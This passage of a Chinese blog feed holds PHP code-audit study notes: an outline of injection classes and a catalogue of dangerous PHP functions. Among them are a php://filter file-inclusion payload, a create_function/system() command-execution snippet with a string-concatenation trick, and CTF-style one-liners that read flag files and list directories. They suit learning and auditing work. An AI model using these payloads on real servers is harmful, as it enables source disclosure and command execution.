</code></pre><h2 id="Translation-1"><a href="#Translation-1" class="headerlink" title="Translation"></a>Translation</h2><center>——End——</center></the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CET </tag>
            
            <tag> Words&amp;Phrases </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[php注入漏洞Summary]]></title>
      <url>/2017/12/14/php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>PHP注入漏洞学习笔记<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">



<h2 id="Command-Injection（命令注入）"><a href="#Command-Injection（命令注入）" class="headerlink" title="Command Injection（命令注入）"></a>Command Injection（命令注入）</h2><p>审计思路：全局搜索敏感函数：“shell_exec“—&gt;了解传递方式—&gt;如何注入（构造payload）—&gt;如何修复（运用正则表达式or……）</p>
<h2 id="Eval-Injection（eval注入）"><a href="#Eval-Injection（eval注入）" class="headerlink" title="Eval Injection（eval注入）"></a>Eval Injection（eval注入）</h2><h2 id="Script-Injection（客户端脚本攻击）"><a href="#Script-Injection（客户端脚本攻击）" class="headerlink" title="Script Injection（客户端脚本攻击）"></a>Script Injection（客户端脚本攻击）</h2><h2 id="Cross-Site-Scripting-XSS（跨网站脚本攻击）"><a href="#Cross-Site-Scripting-XSS（跨网站脚本攻击）" class="headerlink" title="Cross Site Scripting,XSS（跨网站脚本攻击）"></a>Cross Site Scripting,XSS（跨网站脚本攻击）</h2><h2 id="SQL-Injection（SQL注入攻击）"><a href="#SQL-Injection（SQL注入攻击）" class="headerlink" title="SQL Injection（SQL注入攻击）"></a>SQL Injection（SQL注入攻击）</h2><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>审计思路：查看是否存在过滤，如何bypass –&gt;寻找注入点，全局搜索：“from(.*)= \$“ —&gt;查看$query–查看id从哪传递来？–&gt;构造注入语句–&gt;测试字段数（用order by 或者逐一删减）—&gt;获取数据（构造payload）–&gt;如何修复（$id前加‘ 、）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$query= <span class="string">"select * from comment where comment_id = $id"</span>;</span><br><span class="line"><span class="comment">//$id前没有‘ 所以是纯数字型注入</span></span><br></pre></td></tr></table></figure>
<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h4 id="GBK字符集"><a href="#GBK字符集" class="headerlink" title="GBK字符集"></a>GBK字符集</h4><h4 id="转换字符集"><a href="#转换字符集" class="headerlink" title="转换字符集"></a>转换字符集</h4><h3 id="union-select"><a href="#union-select" class="headerlink" title="union select"></a>union select</h3><h3 id="insert-update-delete"><a href="#insert-update-delete" class="headerlink" title="insert update delete"></a>insert update delete</h3><h3 id="server注入"><a href="#server注入" class="headerlink" title="server注入"></a>server注入</h3><h3 id="file注入"><a href="#file注入" class="headerlink" title="file注入"></a>file注入</h3><h3 id="变量覆盖导致注入"><a href="#变量覆盖导致注入" class="headerlink" title="变量覆盖导致注入"></a>变量覆盖导致注入</h3><h3 id="未初始化导致注入"><a href="#未初始化导致注入" class="headerlink" title="未初始化导致注入"></a>未初始化导致注入</h3><h3 id="数组导致注入"><a href="#数组导致注入" class="headerlink" title="数组导致注入"></a>数组导致注入</h3><h4 id="key不过滤或低版本不转义"><a href="#key不过滤或低版本不转义" class="headerlink" title="key不过滤或低版本不转义"></a>key不过滤或低版本不转义</h4><h4 id="offset特性"><a href="#offset特性" class="headerlink" title="offset特性"></a>offset特性</h4><h3 id="like特性"><a href="#like特性" class="headerlink" title="like特性"></a>like特性</h3><h4 id="代表单个任意字符"><a href="#代表单个任意字符" class="headerlink" title="_代表单个任意字符"></a>_代表单个任意字符</h4><h3 id="bypass过滤函数"><a href="#bypass过滤函数" class="headerlink" title="bypass过滤函数"></a>bypass过滤函数</h3><h4 id="striplashes特性"><a href="#striplashes特性" class="headerlink" title="striplashes特性"></a>striplashes特性</h4><h4 id="长度限制截断"><a href="#长度限制截断" class="headerlink" title="长度限制截断"></a>长度限制截断</h4><h2 id="Dynamic-Variable-Evaluation（动态函数注入攻击）"><a href="#Dynamic-Variable-Evaluation（动态函数注入攻击）" class="headerlink" title="Dynamic Variable Evaluation（动态函数注入攻击）"></a>Dynamic Variable Evaluation（动态函数注入攻击）</h2><h2 id="序列化注入-amp-对象注入"><a href="#序列化注入-amp-对象注入" class="headerlink" title="序列化注入&amp;对象注入"></a>序列化注入&amp;对象注入</h2><h2 id="XEE"><a href="#XEE" class="headerlink" title="XEE"></a>XEE</h2></the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Summary </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> PHP注入漏洞 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP常见危险函数及特殊函数Summary]]></title>
      <url>/2017/12/12/phpfunction/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>开始涉足代码审计，将自己的一些笔记记录下来！<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">



<h2 id="PHP代码执行函数"><a href="#PHP代码执行函数" class="headerlink" title="PHP代码执行函数"></a>PHP代码执行函数</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p><strong><em>Grammar:</em></strong>     eval(phpcode)</p>
<p>eval() 函数把字符串按照 PHP 代码来计算。</p>
<p>该字符串必须是‘合法的 PHP 代码’，且必须以‘分号’结尾。</p>
<p>如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$string = <span class="string">"beautiful"</span>;</span><br><span class="line">$time = <span class="string">"winter"</span>;</span><br><span class="line"></span><br><span class="line">$str = <span class="string">'This is a $string $time morning!'</span>;</span><br><span class="line"><span class="keyword">echo</span> $str. <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"\$str = \"$str\";"</span>); <span class="comment">/*一定要用\转义，不然会出现语法错误 */</span></span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">/* eval 还可以实现</span></span><br><span class="line"><span class="comment">  1.运行普通字符串 eg:	eval("echo 'aaa';")</span></span><br><span class="line"><span class="comment">  2.运行带&lt;? php开头的字符串</span></span><br><span class="line"><span class="comment">  3.运行&lt;? Php开头，?&gt;结尾的字符串</span></span><br><span class="line"><span class="comment">  4，运行HTML与PHP混合的字符串</span></span><br><span class="line"><span class="comment">  5.从MySQL读取代码（字符串形式），并动态加载</span></span><br><span class="line"><span class="comment">  6.运行包含include和request的代码</span></span><br><span class="line"><span class="comment">  7.知道运行的过程是否出现异常（但无法捕捉到详细异常信息）</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><p>assert函数在php中用于判断一个表达式是否成立。返回bool；</p>
<p><strong><em>Grammar:</em></strong>     </p>
<p>PHP 5</p>
<figure class="highlight plain"><figcaption><span>**assert** ( [mixed $assertion [, string $description ] )</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool assert ( mixed $assertion [, string $description ] )</span><br></pre></td></tr></table></figure>
<p>PHP 7</p>
<figure class="highlight plain"><figcaption><span>assert ( mixed $assertion [, Throwable $exception ] )</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool assert ( mixed $assertion [, Throwable $exception ] )</span><br></pre></td></tr></table></figure>
<p><code>mixed</code> 说明一个参数可以接受多种不同的（但不一定是所有的）类型。</p>
<p>例如 <a href="http://php.net/manual/zh/function.gettype.php" target="_blank" rel="noopener">gettype()</a> 可以接受所有的 PHP 类型，<a href="http://php.net/manual/zh/function.str-replace.php" target="_blank" rel="noopener">str_replace()</a> 可以接受字符串和数组。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$s = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">echo</span> assert(<span class="string">"is_int($s)"</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">//	1 [Finished in 0.0s]</span></span><br></pre></td></tr></table></figure>
<p>从这个例子可以看到字符串参数会被执行，这跟eval()类似。不过eval($code_str)只是执行符合php编码规范的$code_str。<br>assert的用法却更详细一点。</p>
<p>assert_option()可以用来对assert()进行一些约束和控制;</p>
<blockquote>
<p>默认值</p>
<blockquote>
<p>ASSERT_ACTIVE=1 //Assert函数的开关<br>ASSERT_WARNING =1 //当表达式为false时，是否要输出警告性的错误提示,issue a PHP warning for each failed assertion<br>ASSERT_BAIL= 0 //是否要中止运行；terminate execution on failed assertions<br>ASSERT_QUIET_EVAL= 0 //是否关闭错误提示，在执行表达式时；disable error_reporting during assertion expression evaluation<br>ASSERT_CALLBACK= (NULL) // 是否启动回调函数 user function to call on failed assertions</p>
</blockquote>
</blockquote>
<h3 id="preg-replace-’-e’"><a href="#preg-replace-’-e’" class="headerlink" title="preg_replace +’/e’"></a>preg_replace +’/e’</h3><p>preg_replace — 执行一个正则表达式的搜索和替换</p>
<p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span><br></pre></td></tr></table></figure>
<p>搜索<code>subject</code>中匹配<code>pattern</code>的部分（通常用正则匹配）， 以<code>replacement</code>进行替换。</p>
<p>/e 修正符使preg_replace()将replacement 参数当作php代码执行，但是php5.5.0以及后面的php7都已经不再支持了，用 <a href="http://php.net/manual/zh/function.preg-replace-callback.php" target="_blank" rel="noopener">preg_replace_callback()</a> 代替。</p>
<h3 id="创建函数"><a href="#创建函数" class="headerlink" title="创建函数"></a>创建函数</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string create_function (string $args,string $code)</span><br></pre></td></tr></table></figure>
<p>创建一个匿名函数，但不是真正的匿名函数，因为它返回值为函数名</p>
<p>$args 代表参数，多个参数用逗号分隔，</p>
<p>$code 代表函数体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eg:</span><br><span class="line">func2=create_function(&quot;$args1,$args2&quot;,&quot;return $args1+$args2&quot;);</span><br><span class="line">返回值为创建的函数名，是唯一的一个字符串</span><br><span class="line">函数调用</span><br><span class="line">func2(3,5);  //返回值为8</span><br></pre></td></tr></table></figure>
<blockquote>
<p>创建函数有两种方式：</p>
<p>1.使用<strong>function</strong>关键字</p>
<p>2.用<strong>string create_function (string $args,string $code)</strong></p>
<blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;$cfunc = create_function(<span class="string">'$v'</span>, <span class="string">'return system($v);'</span>);</span><br><span class="line">&gt;&gt;$cfunc = (<span class="string">'whoami'</span>);</span><br><span class="line">&gt;&gt;<span class="comment">//上下两者创建匿名函数的方式不同，但是结果一样</span></span><br><span class="line">&gt;&gt;$cfunc = <span class="string">'sys'</span>.<span class="string">'tem'</span>;<span class="comment">//用'.'来拼接</span></span><br><span class="line">&gt;&gt;$cfunc = (<span class="string">'whoami'</span>);</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
</blockquote>
<p>&gt;</p>
<blockquote>
<p>两种定义函数方式的区别</p>
<p><strong>function定义的函数是在编译阶段生成的</strong></p>
<p><strong>create_function创建的函数是在执行阶段生成的</strong></p>
<p><strong>所以，可以在function定义的函数定义之前或则之后调用它。</strong></p>
</blockquote>
<h3 id="callable"><a href="#callable" class="headerlink" title="callable"></a>callable</h3><p>call_user_func_array()  和。call_user_func()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($v1)</span></span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"testing $v1"</span>;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func(<span class="string">'test'</span>,<span class="string">'karma'</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//输出 testing karma</span></span><br><span class="line"><span class="comment">//若为function test(callable $v1) 强制回调类型，则会出现错误 （why？）</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure>
<h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h3><h2 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h2><h3 id="include"><a href="#include" class="headerlink" title="include"></a>include</h3><p>include如果引入的文件不存在,试图继续往下执行,报一个warning<br>(如果你不介意之前的内容是否被包含，之后的内容都要执行，就使用include)</p>
<p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> $file;</span><br></pre></td></tr></table></figure>
<p>在变量$file 可控的情况下，我们就可以包含任意文件。</p>
<p>由于配置环境不同，可以分为<strong>远程文件</strong>和<strong>本地文件</strong>包含。</p>
<p>包含函数也能读取任意文件内容，需要用到【支持的协议和封装协议】和【过滤器】</p>
<p>eg:用php留filter读取任意文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//?file=php://filter/convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
<h3 id="require"><a href="#require" class="headerlink" title="require"></a>require</h3><p>比include更严谨：</p>
<p>require如果引入的文件不存在,报fatal error,不再继续执行.<br>(如果之前的内容一定要被包含，才允许继续执行之后的代码，就使用require)</p>
<p><em>Include/require 与 include_once /require_once的区别</em></p>
<p><em>_once 会自动判断文件是否已经引入,如果引入,不再重复执行.</em><br><em>即:保证被包含文件只可能被引入一次.</em><br><em>(如果包含的文件里有定义函数，那么被包含的文件只能被包含一次，如果多次包含，就会出现函数重定义的错误，php是不运行函数重定义的，会出现致命错误，之后代码不在运行)</em></p>
<h3 id="allow-url-include-on"><a href="#allow-url-include-on" class="headerlink" title="allow_url_include = on"></a>allow_url_include = on</h3><p>远程文件包含</p>
<h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">(string $command,array[optional] $output,int[optional] $return_value)</span></span></span><br></pre></td></tr></table></figure>
<p>执行一个外部程序</p>
<p>exec 执行系统外部命令时不会输出结果，而是返回结果的最后一行，如果你想得到结果你可以使用第二个参数，让其输出到指定的数组，此数组一个记录代表输出的一行，即如果输出结果有20行，则这个数组就有20条记录，所以如果你需要反复输出调用不同系统外部命令的结果，你最好在输出每一条系统外部命令结果时清空这个数组，以防混乱。第三个参数用来取得命令执行的状态码，通常执行成功都是返回０。</p>
<h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">passthru</span><span class="params">(string $command,int[optional] $return_value)</span></span></span><br></pre></td></tr></table></figure>
<p>执行外部程序并且显示原始输出</p>
<p>passthru与system的区别，passthru直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。</p>
<h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resource proc_open ( string $cmd , <span class="keyword">array</span> $descriptorspec , <span class="keyword">array</span> &amp;$pipes [, string $cwd [, <span class="keyword">array</span> $env [, <span class="keyword">array</span> $other_options ]]] )</span><br></pre></td></tr></table></figure>
<p>执行一个命令，并且打开用来输入/输出的文件指针</p>
<h3 id="shell-exec-amp"><a href="#shell-exec-amp" class="headerlink" title="shell_exec()&amp;``"></a>shell_exec()&amp;``</h3><p>shell_exec() 函数实际上仅是反撇号 (`) 操作符的变体</p>
<p>通过shell环境执行命令，并且将完整的输出以字符串的方式返回。</p>
<h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">system</span><span class="params">(string $command,int[optional] $return_value)</span></span></span><br></pre></td></tr></table></figure>
<p>执行外部程序，并且显示输出</p>
<p>system和exec的区别在于system在执行系统外部命令时，直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，如果执行命令成功则返回true，否则返回false。第二个参数与exec第三个参数含义一样。</p>
<h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popen(command,mode)</span><br></pre></td></tr></table></figure>
<p>通过popen()的参数传递一条命令，并对popen()所打开的文件进行执行。</p>
<h3 id="fcntl-exec"><a href="#fcntl-exec" class="headerlink" title="fcntl_exec()"></a>fcntl_exec()</h3><h3 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start()"></a>ob_start()</h3><h3 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd()"></a>escapeshellcmd()</h3><p>// 该函数用于过滤</p>
<p>……</p>
<h2 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h2><h3 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy(source,destination)</span><br></pre></td></tr></table></figure>
<p>拷贝文件</p>
<h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get contents"></a>file_get contents</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(path,include_path,context,start,max_length)</span><br></pre></td></tr></table></figure>
<p>将整个文件读入一个字符串</p>
<h3 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put contents"></a>file_put contents</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(file,data,mode,context)</span><br></pre></td></tr></table></figure>
<p>将一个字符串写入文件</p>
<h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(path,include_path,context)</span><br></pre></td></tr></table></figure>
<p>把整个文件读入一个数组中</p>
<h3 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fopen(filename,mode,include_path,context)</span><br></pre></td></tr></table></figure>
<p>打开文件或者url</p>
<h3 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file"></a>move_uploaded_file</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file(file,newloc)</span><br></pre></td></tr></table></figure>
<p>将上传的文件移动到新的位置</p>
<h3 id="readfile"><a href="#readfile" class="headerlink" title="readfile"></a>readfile</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(filename,include_path,context)</span><br></pre></td></tr></table></figure>
<p>输出文件</p>
<h3 id="rename"><a href="#rename" class="headerlink" title="rename"></a>rename</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename(oldname,newname,context)</span><br></pre></td></tr></table></figure>
<p>重命名一个文件或目录</p>
<h3 id="rmdir"><a href="#rmdir" class="headerlink" title="rmdir"></a>rmdir</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmdir(dir,context)</span><br></pre></td></tr></table></figure>
<p>删除目录</p>
<h3 id="unlink-amp-delete"><a href="#unlink-amp-delete" class="headerlink" title="unlink &amp; delete"></a>unlink &amp; delete</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlink(filename,context)</span><br></pre></td></tr></table></figure>
<p>删除文件</p>
<h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><blockquote>
<p>hightlight_file($filename);<br>show_source($filename);<br>print_r(php_strip_whitespace($filename));<br>print_r(file_get_contents($filename));<br>readfile($filename);<br>print_r(file($filename)); // var_dump<br>fread(fopen(filename,”r”),filename,”r”),size);<br>include($filename); // 非php代码<br>include_once($filename); // 非php代码<br>require($filename); // 非php代码<br>require_once($filename); // 非php代码<br>print_r(fread(popen(“cat flag”, “r”), $size));<br>print_r(fgets(fopen($filename, “r”))); // 读取一行<br>fpassthru(fopen($filename, “r”)); // 从当前位置一直读取到 EOF<br>print_r(fgetcsv(fopen(filename,”r”),filename,”r”),size));<br>print_r(fgetss(fopen($filename, “r”))); // 从文件指针中读取一行并过滤掉 HTML 标记<br>print_r(fscanf(fopen(“flag”, “r”),”%s”));<br>print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组</p>
</blockquote>
<p>……</p>
<h2 id="特殊函数"><a href="#特殊函数" class="headerlink" title="特殊函数"></a>特殊函数</h2><h3 id="信息泄漏"><a href="#信息泄漏" class="headerlink" title="信息泄漏"></a>信息泄漏</h3><h4 id="bool-phpinfo-int-what-INFO-ALL"><a href="#bool-phpinfo-int-what-INFO-ALL" class="headerlink" title="bool phpinfo ([int $what = INFO_ALL])"></a>bool phpinfo ([int $what = INFO_ALL])</h4><p>输出php当前状态的大量信息</p>
<h3 id="软连接-读取文件内容："><a href="#软连接-读取文件内容：" class="headerlink" title="软连接-读取文件内容："></a>软连接-读取文件内容：</h3><h4 id="bool-symlink-string-target-string-link"><a href="#bool-symlink-string-target-string-link" class="headerlink" title="bool symlink (string $target ,string $link)"></a>bool symlink (string $target ,string $link)</h4><p>symlink()对于已有的target建立一个名为link的符号连接</p>
<h4 id="string-redline-string-path"><a href="#string-redline-string-path" class="headerlink" title="string redline (string $path)"></a>string redline (string $path)</h4><p>readlink()和同名的c函数做同样的事，返回符号连接的内容</p>
<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><h4 id="string-getenv-string-varname"><a href="#string-getenv-string-varname" class="headerlink" title="string getenv (string $varname)"></a>string getenv (string $varname)</h4><p>获取一个环境变量的值</p>
<h4 id="bool-putenv-string-setting"><a href="#bool-putenv-string-setting" class="headerlink" title="bool putenv (string $setting)"></a>bool putenv (string $setting)</h4><p>增加setting到服务器环境变量。环境变量仅存活于当前请求期间。在请求结束时环境会恢复到初始状态</p>
<h3 id="加载扩展"><a href="#加载扩展" class="headerlink" title="加载扩展"></a>加载扩展</h3><h4 id="bool-dl-string-library"><a href="#bool-dl-string-library" class="headerlink" title="bool dl (string $library)"></a>bool dl (string $library)</h4><p>载入指定参数library的php扩展</p>
<h3 id="配置相关"><a href="#配置相关" class="headerlink" title="配置相关"></a>配置相关</h3><p>string ini_get (string $varname)</p>
<p>成功时返回配置选项的值</p>
<p>string ini_set (string $varname , string $newvalue)</p>
<p>string ini_alter (string $varname , string $newvalue)</p>
<p>设置指定配置选项。这个选项会在脚本执行时 保持新的值，并在脚本结束后恢复</p>
<p>void ini_numeric (mixed $var)</p>
<p>恢复指定的配置选项到它的原始值</p>
<h3 id="数字判断"><a href="#数字判断" class="headerlink" title="数字判断"></a>数字判断</h3><p>Bool is_numeric (mixed $var)</p>
<p>如果var时数字和数字字符串则返回true，否则返回false</p>
<p><strong>仅用is_numeric判断而不用intval转换就有可能插入16进制的字符串到数据库，进而可能导致sql二次注入</strong></p>
<h3 id="数组相关"><a href="#数组相关" class="headerlink" title="数组相关"></a>数组相关</h3><p>Bool in_array (mixed. $needle , array $haystack [,bool $strict =false])</p>
<p>在haystack中搜索needle，如果没有设置strict则使用宽松的比较</p>
<p>该函数有一个特性，比较之前会进行自动类型转换：<strong><em>$a = ‘1abc’;</em></strong></p>
<h3 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h3><blockquote>
<p><a href="http://php.net/manual/zh/language.variables.superglobals.php" target="_blank" rel="noopener">$GLOBALS</a></p>
</blockquote>
<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>void parse_str (string $str [,array &amp; &amp;str])</p>
<p>如果str是URL传递入的查询字符串(query string)，则将它解析为变量并设置到当前作用域</p>
<p>int extract (array &amp;var_array [,int $extract_type = EXTR_OVERWRITE [, srting $orefix = NULL]])</p>
<p>本函数用来将变量从数组中导入到当前的符号表中。检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突</p>
<p>Bool mb_parse_str ( string $encoded_string [, array. &amp;result ])</p>
<p>解析GET/POST/Cookie 变量导入到全局作用域中。如果你禁止了 register_glovals，但又想用到一些全局变量，那么此函数就很有用</p>
<blockquote>
<p>extract()<br>import_request_variables()<br>parse_str()<br>mb_parse_str()<br>全局变量覆盖：register_globals为ON，$GLOBALS</p>
</blockquote>
<h3 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h3><p>array glob ( string $pattern [, int $flags =0])</p>
<p>glob()函数依照libc glob()函数使用的规则寻找所有与pattern匹配的文件路径，类似于一般shells所用的规则一样。不进行缩写扩展或参数替代。</p>
<blockquote>
<p>print_r(glob(“<em>”)); // 列当前目录<br>print_r(glob(“/</em>”)); // 列根目录 print_r(scandir(“.”));<br>print_r(scandir(“/“));<br>$d=opendir(“.”);while(false!==($f=readdir($d))){echo”$f\n”;}<br>$d=dir(“.”);while(false!==($f=$d-&gt;read())){echo$f.”\n”;}</p>
</blockquote>
<h3 id="无参数获取信息"><a href="#无参数获取信息" class="headerlink" title="无参数获取信息"></a>无参数获取信息</h3><p>array get_defined_vars (void)</p>
<p>返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户自定义变量</p>
<p>array get_defined_constants ([bool $categorize = false])</p>
<p>返回当前所有已定义的常量名和值。这包含define()函数所创建的，也包含了所有拓展所创建的</p>
<p>array get_defined_functions (void)</p>
<p>返回一个包含所有已定义函数列表的多位数组</p>
<p>array get_included_files (void)</p>
